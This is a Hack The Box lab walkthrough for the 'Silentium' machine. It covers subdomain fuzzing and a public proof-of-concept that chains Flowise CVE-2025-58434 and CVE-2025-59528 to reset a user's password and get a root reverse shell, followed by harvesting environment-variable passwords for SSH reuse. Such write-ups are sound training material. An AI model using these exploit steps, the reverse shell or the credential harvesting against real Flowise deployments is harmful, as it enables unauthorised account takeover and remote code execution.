---
title: Hack the box - Silentium
date: 2026-08-17 12:00:00 +00:00
tags: [htb, linux, hack]
description: Hack the box - silentium walkthrough
---

# Silentium

## Exploring

Since this is an easy machine, start with a quick port scan:

```shell
$ nmap -F 10.129.106.235
PORT   STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

Opening a web app on port 80 in a browser throws a domain resolution error. 
Map the target host in `/etc/hosts`:

```shell
$ cat /etc/hosts
...
10.129.106.235 silentium.htb
```

## User flag

There's nothing interesting about a single-page, static web application, so 
it's worth starting with searching for subdomains.

```shell
$ gobuster fuzz -u http://silentium.htb/ -w wordlist/subdomains.txt -H "Host: FUZZ.silentium.htb" -b 301
[Status=200] [Length=3142] [Word=staging] http://silentium.htb/
```

After adding a subdomain to `/etc/hosts`, you can view the contents of the new 
subdomain and see the following:

<img src="/assets/img/hack-the-box-machine-silentium/flowise.png">

Quick search allows you to find vulnerability [^1] and an exploit for it [^2].
But to launch the exploit, a valid email address is needed to reset the 
password.

But we remembers that the main website has a section with team members.

<img src="/assets/img/hack-the-box-machine-silentium/team.png">

After trying several email listing options (`marcus.thorne@silentium.htb`, 
`m.thorne@silentium.htb`, `ben@silentium.htb`), one of them works:

```shell
$ wget https://raw.githubusercontent.com/AzureADTrent/CVE-2025-58434-59528/refs/heads/main/flowise_chain.py

$ python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb
[*] Email:       ben@silentium.htb
[*] Step 1: CVE-2025-58434 — Requesting password reset token...
[+] Got tempToken for user 'admin'
[*] Step 2: Resetting password to 'Pwn3d!2026'...
[+] Password reset successful.

==============================================================
  MANUAL STEP REQUIRED
==============================================================
  The password for 'ben@silentium.htb' has been reset to:
  Password: Pwn3d!2026

  Due to a Flowise 3.0.5 quirk, the API login endpoint
  doesn't accept the new password immediately. You need
  to grab the API key from the UI manually:

  1. Browse to: http://staging.silentium.htb/login
  2. Login with: ben@silentium.htb / Pwn3d!2026
  3. Navigate to: http://staging.silentium.htb/apikey
  4. Copy the API key shown on the page
==============================================================

  Paste API key here and press Enter: hWp_8******UJc

[*] Now set up a listener for the reverse shell.
  Enter your IP (LHOST): 10.10.17.215
  Enter your port (LPORT) [4444]: 9001

[!] Start listener: nc -lvnp 9001
[*] Press Enter when listener is ready...

[+] API key:     hWp_8jB76zi0VtKS...
[*] Step 4: CVE-2025-59528 - Triggering CustomMCP RCE...
[+] TIMEOUT - reverse shell may have connected

[*] Done.
```

After receiving the shell, let's take a look around a bit, since it's strange 
that we immediately became root:

```shell
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.106.235 44075

/ # id
uid=0(root) gid=0(root) groups=0(root),0(root),..

/ # ls -la ~
-rw-------    1 root     root             9 Jan 29  2026 .ash_history
drwxr-xr-x    3 root     root          4096 Aug 18 09:35 .flowise

/ # cat /root/.ash_history
env
exit

/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
...
```

We have new passwords, let's try `ssh` logging in with them under `ben`:

```shell
$ ssh -o IdentitiesOnly=yes ben@silentium.htb
ben@silentium.htb's password:

ben@silentium:~$ ls -l
user.txt
```

---

## References

[^1]: [Flowise CVE-2025-58434](https://nvd.nist.gov/vuln/detail/cve-2025-58434)
[^2]: [PoC CVE-2025-58434](https://github.com/AzureADTrent/CVE-2025-58434-59528)
